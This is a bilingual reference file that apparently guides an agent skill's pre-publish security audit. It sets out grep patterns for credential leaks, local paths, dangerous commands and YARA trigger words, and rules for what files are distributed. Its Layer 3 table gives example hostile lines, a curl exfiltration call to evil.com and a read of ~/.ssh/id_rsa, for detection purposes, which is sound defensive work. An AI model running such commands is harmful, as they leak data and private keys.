# Security Audit Reference

Complete procedures for pre-publish security scanning, privacy scrubbing, and distribution judgment.

**When to read**: When entering Phase 2 (pre-publish audit). Read this file in full before running any scans.

---

## Three-Layer Security Scan

### Layer 1: Credential Leak Scan

**Grep pattern (v5.0 扩展)**: `token|api_key|api-key|secret|password|ghp_|gho_|ghs_|clh_|sk-|AKIA|cli_|IMA_OPENAPI|FEISHU_APP|APP_SECRET|CLIENTID|APIKEY|client_id|client_secret|skh_`

> **v5.0 新增模式**（2026-07，源自 IMA/飞书凭证泄露事件）：
> `cli_`（飞书 app_id 前缀）、`IMA_OPENAPI`（IMA 凭证环境变量名）、`FEISHU_APP`（飞书凭证环境变量名）、`APP_SECRET`（飞书/通用 secret）、`CLIENTID`/`APIKEY`（IMA v1.1.7 凭证）、`client_id`/`client_secret`（OAuth 通用凭证）

> **v5.1 新增模式**（2026-07，支持 SkillHub 平台）：
> `skh_`（SkillHub API Token 前缀，格式为 `skh_` + 64 位十六进制字符）

**PASS criteria**: Only conceptual mentions in security documentation (e.g., "requests credentials" in a security checklist). No actual token values, API keys, or secrets. 环境变量名出现在 `.gitignore` 或配置说明文档中（如 `$env:FEISHU_APP_ID = "your_app_id_here"`）算 PASS，但出现真实值（如 `cli_your_app_id_here...`）算 FAIL。

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Git remote with token | `https://user:ghp_your_token_here@github.com/...` | Use SSH or credential helper |
| Hardcoded API key | `OPENAI_API_KEY = "sk-..."` | Move to `.env.local` |
| Config with real values | `"app_id": "your_app_id_here"` | Replace with placeholder in published config |
| Log files with tokens | `publish_run.log` containing `ghp_` | Add `*.log` to .gitignore |
| **IMA 凭证硬编码**（v5.0） | `IMA_OPENAPI_CLIENTID = "your_client_id_here"` | Replace with placeholder |
| **飞书凭证硬编码**（v5.0） | `FEISHU_APP_ID = "your_app_id_here"` | Replace with placeholder |
| **Python 脚本含 Token**（v5.0） | `TOKEN = "ghp_your_token_here"` in upload scripts | Delete script, use env var `GH_TOKEN` |
| **SkillHub Token 硬编码**（v5.1） | `SKILLHUB_TOKEN = "skh_your_token_here"` in scripts/docs | Replace with `"your_skillhub_token_here"` or use `$env:SKILLHUB_TOKEN` |

### Layer 2: Local Path Scan

**Grep pattern**: `C:\\|D:\\|/Users/|/home/|Administrator|\.trae-cn|\.trae\\`

**PASS criteria**: Zero matches. No local absolute paths, no Windows usernames, no `.trae-cn` directory references.

**扫描范围强化（v5.22 新增，源自 2026-07-20 周度审查建议）**：除 SKILL.md/references/CHANGELOG.md 等常规文件外，必须额外扫描以下易遗漏目录：
- `examples/` — 示例代码目录，常包含真实路径和占位符凭证（最易被忽略）
- `samples/` / `demo/` / `samples-output/` — 示例输出目录
- `tests/` / `test-data/` — 测试目录，可能含 fixture 数据
- `scripts/` — 脚本目录，可能含硬编码路径

**examples 目录专项扫描规则（v5.22 新增）**：
1. **路径扫描**：examples/ 下所有文件（.md/.py/.js/.json/.yaml）执行上述 Grep pattern
2. **凭证占位符扫描**：扫描 examples/ 中是否包含看似占位符但实为真实凭证的字符串（如 `your_xxx_here` 但实际值是 `cli_xxx`）。检测模式：占位符文本 + 实际值前缀同时出现 = WARN
3. **真实路径泄露扫描**：examples/ 中的示例输出常含真实路径（如 `d:\TRAE SOLO CN\project\...`）。检测模式：上述 Grep pattern，但 examples/ 中的匹配 = WARN（建议改为 `<project-dir>` 等占位符），不阻断发布
4. **用户身份信息扫描**：examples/ 中的日志/输出可能含用户名/邮箱/IP。检测模式：`Administrator|admin@|@users\.noreply|192\.168\.|127\.0\.0\.1`，匹配 = WARN

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| Absolute paths in docs | `d:\TRAE SOLO CN\project\...` | Use relative paths |
| Username in paths | `C:\Users\Administrator\...` | Use `~` or `<user-home>` |
| .trae-cn references | `.trae-cn/skills/...` | Use `.trae/skills/` (generic) |
| **examples/ 真实路径泄露**（v5.22） | `examples/output.md` 含 `d:\TRAE SOLO CN\project\...` | 改为 `<project-dir>/...` 占位符 |
| **examples/ 凭证占位符混入真实值**（v5.22） | `examples/config.json` 含 `your_app_id_here` 但旁边有 `cli_xxx` | 移除真实值，统一为 `your_xxx_here` |
| **examples/ 用户身份信息**（v5.22） | `examples/run.log` 含 `Administrator` 或 `admin@company.com` | 改为 `<user>` 或 `<user>@<org>` |

**FAIL 条件分级（v5.22 新增）**：
- SKILL.md/references/CHANGELOG.md 中匹配 = **FAIL**（阻断发布）
- examples/ 中匹配 = **WARN**（不阻断，提示作者修复）
- tests/ 中匹配 = **WARN**（不阻断，提示作者修复）

**设计原则**：examples/ 和 tests/ 中的路径泄露风险低于核心文档，但仍应修复。WARN 级别让作者知道有改进空间，不阻断发布流程。

### Layer 3: Dangerous Command Scan

**Grep pattern**: `curl|wget|eval|exec|base64|sudo|\.ssh|\.aws|\.config`

**PASS criteria**: Only conceptual mentions in security documentation. No actual curl/wget to external URLs, no eval/exec with external input, no reading of sensitive directories.

**Common leak patterns**:

| Pattern | Example | Fix |
|---------|---------|-----|
| curl to external server | `curl https://evil.com/collect?data=...` | Remove entirely |
| eval with user input | `eval(user_input)` | Remove or sandbox |
| Reading sensitive dirs | `cat ~/.ssh/id_rsa` | Remove |

### Layer 4: YARA Trigger Word Scan (v5.7 新增)

> **背景**：ClawHub SkillSpector 使用 YARA 规则 `agent_skill_destructive_autonomous_actions` 扫描"自治破坏行为"字面量。这些字符串即使在文档说明中出现（不是实际执行），也会触发 YARA 匹配并被标记为 High 级别 finding。源自 2026-07 v5.4-v5.6 三轮 SkillSpector finding 修复经验。

**扫描范围**：skill 目录下所有文件，**包括 CHANGELOG.md 历史记录**。SkillSpector 不限于扫描 SKILL.md，任何文件中的字面量都会被匹配。

**扫描类别**（用类别描述，不写字面量，避免本文件自身触发）：

| 类别 | 风险 | 说明 |
|------|------|------|
| Shell history 清理命令 | High | 清理 shell history 的命令字面量，被标记为"自治破坏行为" |
| PowerShell 错误忽略参数 | High | 忽略 PowerShell 错误的参数字面量，被标记为"自治破坏行为" |
| 递归强制删除 | High | 递归强制删除文件系统的命令组合 |
| 权限放宽 | High | 全权限设置命令（如为所有用户设置读写执行权限） |
| 输出重定向到空设备 | Medium | 丢弃标准输出/stderr 的重定向（注意：`2>` 重定向 stderr 在 v5.6.0 已验证不触发 YARA，但纯 stdout 重定向可能触发） |

**PASS criteria**: 零匹配。这些字面量即使在"说明为什么不要用"的文档语境中出现也会触发 YARA 规则。如果需要指代这些命令，用类别描述（如"shell history 清理命令"）替代字面量。

**修复方式**：
- 文档中需要指代此类命令时，用类别描述替代字面量（如"PowerShell 错误忽略参数"而不是参数本身）
- CHANGELOG 历史记录中如果包含字面量，重新措辞该条目
- 代码中如果确实需要使用，确保不出现在发布的文件中（执行时用，不写进文档）

> **关键教训**：YARA 规则是字面量匹配，不是语义分析。即使你在文档中写"不要使用 XXX 命令"，XXX 本身就会触发匹配。正确做法是用类别描述指代，不写字面量。

### Layer 4.5: Frontmatter 声明完整性检查 (v5.18 新增，源自 ClawHub docs/skill-format.md 规范；v5.18.1 标注为跨平台通用预检层；v5.19 扩展为 7 项 — 新增 requires.config 子段 + Name-Summary Coherence)

> **背景**：ClawHub 安全分析核心机制是"声明与行为匹配"。如果代码引用了 `GITHUB_TOKEN` 但 frontmatter 未声明在 `metadata.openclaw.requires.env` / `primaryEnv` / `envVars` 中，会被标记为 metadata mismatch（Context-Inappropriate Capability 的根因之一）。v5.17.x 系列 6 次调试发布的根因正是 frontmatter 完全缺失 `metadata.openclaw` 结构。

> **v5.18.1 跨平台通用性标注**：本层检查不仅适用于 ClawHub 发布，也适用于 SkillHub 发布。底层逻辑——"代码引用的环境变量/二进制必须在 frontmatter 声明"——是 agent skill 这个形态的通用安全属性，与平台无关。SkillHub 虽然没有 `metadata.openclaw` 命名空间强制要求，但保留该结构不会报错（未知字段被忽略），且能提升 skill 在任何平台的可信度。**适用范围**：所有平台发布前的强制预检层。详见 SKILL.md 规则 30「跨平台通用规则预检」。

**检查项**（7 项，源自 [ClawHub skill-format.md](https://github.com/openclaw/clawhub/blob/main/docs/skill-format.md)；v5.19 新增第 6-7 项源自 skill-auditor v2.0.0）：

| 检查项 | PASS 条件 | FAIL 处理 |
|--------|----------|----------|
| `metadata.openclaw` 结构存在 | frontmatter 含 `metadata.openclaw` 嵌套结构 | 补齐结构 |
| `requires.env` 覆盖代码中所有凭证环境变量 | 扫描代码中所有环境变量读取模式（PowerShell/Python/Node 各自的 env 读取语法），提取变量名 X，必须在 `requires.env` 或 `envVars` 中声明 | 补齐声明或移除未声明的环境变量引用 |
| `primaryEnv` 指向主凭证变量 | `primaryEnv` 值在 `requires.env` 列表中 | 设置 primaryEnv 为最核心的凭证环境变量 |
| `requires.bins` / `anyBins` 覆盖代码调用的 CLI | 扫描 subprocess 调用的二进制名，在 `requires.bins` 或 `anyBins` 中声明 | 补齐声明 |
| `envVars` 中可选变量标 `required: false` | `requires.env` 中不放可选变量，可选变量在 `envVars` 中标 `required: false` | 调整结构 |
| `requires.config` 子段（v5.19 新增，D-M3） | 如 skill 代码读取配置文件（如 `*.json` / `*.yaml`），frontmatter `metadata.openclaw.requires.config` 必须声明配置文件路径或类别；skill 明确不使用配置文件时无需声明 | 补齐 `requires.config` 声明，或在 SKILL.md 明确说明 skill 不使用配置文件 |
| Name-Summary Coherence（v5.19 新增，P-C1） | frontmatter `name` 关键词与 `description`/`summary` 关键词重叠度 ≥ 30% | WARN（不阻断）：调整 name 或 description 使二者指向同一概念 |

**扫描方式**：
1. 解析 SKILL.md frontmatter（YAML 解析）
2. Grep 扫描代码中所有环境变量引用模式：`\$env:[A-Z_]+` / `os\.environ\[['"]([A-Z_]+)['"]\]` / `process\.env\.([A-Z_]+)`
3. 比对引用集合 vs 声明集合，差集 = 未声明的环境变量
4. 同样扫描 subprocess 调用的二进制名

**FAIL 条件**：任何代码引用的环境变量未在 frontmatter 声明 = FAIL（阻断发布）

**设计原则**：ClawHub 安全分析哲学是"声明即透明"——只要 frontmatter 准确声明了 skill 需要的环境变量和二进制，代码从环境变量读取凭证就是合规行为。这是从 v5.17.x"移除行为"思维转向 v5.18"声明对齐"思维的根本性转变。

**参考示例**（skill-publisher v5.18.0 frontmatter）：
```yaml
metadata:
  openclaw:
    requires:
      env:
        - GITHUB_TOKEN
        - CLAWHUB_TOKEN
        - SKILLHUB_TOKEN
      bins:
        - git
        - python
      anyBins:
        - clawhub
        - skillhub
    primaryEnv: GITHUB_TOKEN
    envVars:
      - name: GITHUB_TOKEN
        required: true
        description: GitHub PAT
      - name: FEISHU_APP_ID
        required: false
        description: 可选，飞书云空间备份
```

### Layer 4.5 未纳入的 skill-auditor v2.0.0 检查项

> **背景**（v5.19 新增）：skill-auditor v2.0.0 引入了 4 个新检查项系列（T-AST 8 项 + T-LT 3 项 + D-M 3 项 + P-C 4 项）。其中部分检查项需审计期运行时上下文或语义判断，不适合发布预扫描（静态 Grep 无法覆盖）。以下检查项不纳入 Layer 4.5，建议在发布前用 skill-auditor L3 审计执行：

| 检查项 | 原因 |
|--------|------|
| T-AST01/03/04/10 | 与现有 Layer 1-5 + 规则 25 重叠 |
| T-AST06（隔离薄弱） | 需语义判断"沙箱声明"，Grep 无法覆盖 |
| T-AST07（更新漂移 hash 验证） | 需联网拉取依赖 hash |
| T-LT 系列（Lethal Trifecta） | 需审计期运行时上下文，发布期静态扫描会误报 |
| P-C2/P-C3 | 与规则 25 第 2 项 + Layer 4.5 重叠 |
| P-C4（Power-Proportionality） | 需 LLM 语义判断"权力与用途比例" |

**设计原则**：发布预扫描（skill-publisher）覆盖声明-行为一致性的静态可判定部分；审计期深度检查（skill-auditor L3）覆盖需语义判断或运行时上下文的部分。两者形成两层防护——发布预扫描快速阻断静态可检测的风险，审计期深度检查覆盖发布预扫描无法覆盖的部分。

### Layer 5: SSD3 + MCP + User Warnings Scan (v5.9 新增)

> **背景**：2026-07-12 skillhub-daily 发布后收到 17 个 SkillSpector findings，其中 6 个是此前未遇到过的新模式。这些模式与 YARA 触发词不同，是语义分析而非字面量匹配。

**4 类新扫描**：

#### 5.1 SSD3 敏感数据派生输出

**扫描内容**：检查 Python 脚本是否读取本地敏感文件（memory/profile/credentials/config），并将派生内容写入持久化输出（JSON/MD/日志）。

**常见触发模式**：
```python
# 触发 SSD3：读取 memory 文件后将其内容写入 JSON
user_keywords = load_user_memory_keywords()  # 读取 memory
rec_data = {"memory_keywords": user_keywords}  # 派生数据写入 JSON
json.dump(rec_data, f)  # 持久化
```

**PASS criteria**：输出文件中不包含从敏感文件派生的原始内容。只记录聚合统计量。

**修复方式**：
- 将 `{"memory_keywords": {kw: w, ...}}` 改为 `{"memory_keyword_count": N}`
- 推荐理由中不暴露匹配的关键词，改为 generic 描述（如"记忆碰撞匹配（权重 N）"）
- 输出日志中不打印关键词列表

#### 5.2 MCP Tool Poisoning 完整行为声明

**扫描内容**：frontmatter description 是否完整声明 skill 的全部行为。

**触发条件**：description 只描述核心功能，但代码实际包含以下能力之一：
- 读取本地文件（memory/profile/config）
- 网络请求（urllib.request / subprocess CLI 调用）
- subprocess 调用（subprocess.run / os.system）
- 写入外部服务（API POST / 文件上传）

**PASS criteria**：description 包含"本技能的行为范围"段落，列出全部行为。

**修复方式**：在 description 中增加行为声明段落，例如：
```
本技能的行为范围（用户须知）：
- 读取本地记忆文件提取关键词
- 调用 CLI 工具获取数据（网络请求）
- 将结果写入本地文件和外部服务
```

#### 5.3 MCP Least Privilege 权限声明

**扫描内容**：SKILL.md 或 plugin.json 是否声明 skill 需要的权限。

**触发条件**：代码实际使用了网络/文件/环境变量/subprocess，但 SKILL.md 和 plugin.json 均未声明。

**PASS criteria**：SKILL.md 正文或 plugin.json 中包含权限声明。

**修复方式**：在 SKILL.md 中增加权限声明段落：
```
权限声明：需要网络访问（API 调用）、本地文件读写（data 目录）、环境变量（XXX_YYY）
```
或在 plugin.json 中声明：
```json
"permissions": {
  "network": true,
  "filesystem": {"read": ["data/"], "write": ["data/output/"]},
  "env_vars": ["API_KEY", "CONFIG_PATH"]
}
```

#### 5.4 Missing User Warnings

**扫描内容**：如果 skill 有副作用（自动推送/写入外部服务/定时执行），README 是否包含用户警告。

**触发条件**：README 中描述了自动推送/定时执行/外部写入，但没有用户警告。

**PASS criteria**：README 包含用户警告，明确告知副作用和禁用方式。

**修复方式**：在 README 中增加警告段落：
```
> **用户须知**：运行本技能会自动将结果写入 [目的地列表]。如不需推送，使用 --skip-push 参数。
```
中英文 README 必须同步包含警告。

---

## Scan Execution

### ⚠️ Critical: .gitignore Blind Spot (v5.8 新增)

**Grep (ripgrep) 默认遵守 `.gitignore`，会跳过被忽略的文件。但 `clawhub publish` 上传整个目录，不看 `.gitignore`（v5.18 起用 `.clawhubignore` 显式排除）。** 这造成了一个致命盲区：`.gitignore` 中的凭证文件（如 `config.local.json`、`.env.local`）对 Grep 扫描"不可见"，但对 ClawHub 发布"完全可见"。**v5.18 修复**：新增 `.clawhubignore` 文件作为 ClawHub 发布专用排除层，所有凭证文件/临时脚本/构建产物显式排除。

**历史事故**（2026-07-12）：`references/config.local.json` 含真实飞书凭证，在 `.gitignore` 中（未进 GitHub），但被 `clawhub publish` 上传到 ClawHub 平台，导致凭证泄露。Grep 扫描报告 PASS，因为 ripgrep 跳过了该文件。**v5.18 根本修复**：`.clawhubignore` 文件排除所有凭证文件模式，ClawHub publish 会读取该文件并跳过匹配的文件。

### Pre-Scan: Mandatory File Listing (v5.8 新增)

**在执行 Grep 扫描之前，必须先用 `LS` 工具列出技能目录的完整文件列表**（LS 不遵守 `.gitignore`，会显示所有文件）：

```
LS: <skill-directory> (ignore: ["**/.git/**", "**/__pycache__/**"])
```

**检查以下凭证文件是否存在于目录中**（存在 = FAIL，必须删除或移出目录）：

| 文件名模式 | 说明 | 处理 |
|-----------|------|------|
| `config.local.json` | 本地凭证文件 | 删除或移出技能目录 |
| `.env.local` / `.env` | 环境变量文件 | 删除或移出技能目录 |
| `config.local.*.json` | 本地凭证变体 | 删除或移出技能目录 |
| `_*.py` / `_*.ps1` | 临时脚本（`_` 前缀） | 删除 |
| `*.log` | 日志文件 | 删除 |
| `publish_*.ps1` / `publish_*.sh` | 维护者发布脚本 | 移出技能目录 |

### Grep Scans (v5.8 修正)

**Grep 工具的 `glob` 参数不能排除 `.gitignore` 中的文件。** 如果使用 TRAE 的 Grep 工具（基于 ripgrep），必须注意：

1. **Grep 工具可能默认跳过 `.gitignore` 中的文件**——这是 ripgrep 的默认行为
2. **对于已知凭证文件**（如 `config.local.json`），即使 Grep 扫描报告 PASS，也要通过 Pre-Scan 的 LS 检查确认文件不存在
3. **如果技能目录中有 `config.local.json` 等凭证文件**，Grep 扫描结果不可信（因为 ripgrep 跳过了），必须依赖 LS 检查

Run all four scans via Grep on the entire skill directory:

```
1. LS: list all files (including .gitignore'd) → check for credential files → PASS/FAIL
2. Grep: credential pattern → check each match → PASS/FAIL
3. Grep: local path pattern → check each match → PASS/FAIL
4. Grep: dangerous command pattern → check each match → PASS/FAIL
5. Grep: YARA trigger word categories (Layer 4) → check each match → PASS/FAIL
```

**Any FAIL = block publish.** Fix the issue, re-run scan. Only proceed when all five PASS.

### Post-Publish Verification (v5.8 强化)

**发布后必须验证 ClawHub 上的文件列表**，确认无凭证文件被上传：

```bash
clawhub inspect <slug>
# 检查文件列表中不包含：
# - config.local.json / .env.local / .env
# - _*.py / _*.ps1 (临时脚本)
# - *.log (日志文件)
# - publish_*.ps1 / publish_*.sh (维护者脚本)
```

---

## Distribution Judgment (Three-Question Test)

For each file in the skill directory, answer three questions:

1. **Does the user need this file after installing the skill?**
2. **Does this file participate in the skill's execution flow?**
3. **Can the skill still work if this file is deleted?**

| Category | Judgment | Action | Examples |
|----------|----------|--------|----------|
| Execution dependency | Three "yes" | Must include | SKILL.md, plugin.json, references/*.md, scripts/*.py |
| Project metadata | Not in execution, but users/devs need | Include | README.md, LICENSE, CHANGELOG.md, docs/*.md |
| Maintainer tools | Three "no" | Exclude | *.ps1, *.sh (publish scripts) |
| VCS config | Three "no" | Exclude from zip, keep in repo | .gitignore |
| Runtime data | Three "no" | Exclude | data/, *.log |
| Credential files | Three "no" + security risk | Must exclude | .env.local, config.local.json |

### Key Distinctions

- `.gitignore` stays in GitHub repo (for developers who clone) but excluded from ClawHub distribution
- `publish_all.ps1` and similar scripts are maintainer tools — never include in distribution
- `references/config.json` with placeholders IS an execution dependency — must include
- `references/config.local.json` with real credentials is NOT — must exclude

### ClawHub Auto-Generated Files (v5.0 新增)

**ClawHub 会自动生成以下文件，禁止手动发布**：

| 文件/目录 | 生成时机 | 处理方式 |
|----------|---------|---------|
| `skill-card.md` | ClawHub 发布时自动生成 | **必须删除**（如果存在于本地） |
| `.clawhub/` | ClawHub install/publish 时生成 | **必须加入 .gitignore**，不发布 |
| `.clawhub/origin.json` | ClawHub install 时生成 | 同上 |
| `_meta.json` | ClawHub publish 时生成 | 同上 |

**发布前检查**：

```bash
# 检查 skill-card.md 是否存在
Test-Path skill-card.md
# 如果存在 → 删除

# 检查 .clawhub/ 目录
Test-Path .clawhub
# 如果存在 → 加入 .gitignore，不删除（本地需要）
```

**故障案例（2026-07）**：web-to-fim 技能发布时，skill-card.md 被打包上传，ClawHub 拒绝发布，报错 "skill-card.md is auto-generated"。删除后重新发布成功。

---

## Common Leak Patterns & Remediation

### Pattern 1: Token in git remote URL

```
# LEAKED
https://EdwardWason:ghp_your_token_here@github.com/EdwardWason/repo.git

# FIX: Use credential helper or SSH
git remote set-url origin git@github.com:EdwardWason/repo.git
```

### Pattern 2: .env.local in distribution

```
# FIX: Add to .gitignore AND exclusion list
.env.local
config.local.json
```

### Pattern 3: PowerShell script with local paths

```
# LEAKED: publish_all.ps1 contains "d:\TRAE SOLO CN\..."
# FIX: Exclude all .ps1 files from distribution
```

### Pattern 4: Log files with sensitive data

```
# LEAKED: publish_run.log contains tokens and local paths
# FIX: Add *.log to .gitignore and exclusion list
```

---

## Post-Publish Verification

After publishing, verify on both platforms:

### GitHub Verification

```powershell
# List all files in repo
$tree = Invoke-RestMethod -Uri "https://api.github.com/repos/$Owner/$Repo/git/trees/main?recursive=1" -Headers $Headers
$tree.tree | Where-Object { $_.type -eq "blob" } | ForEach-Object { Write-Host $_.path }
# Check: no data/, *.ps1, .env.local, *.log
```

### ClawHub Verification

```bash
clawhub inspect <slug>
# Check: Security field = CLEAN
# Check: file list contains only expected files
```
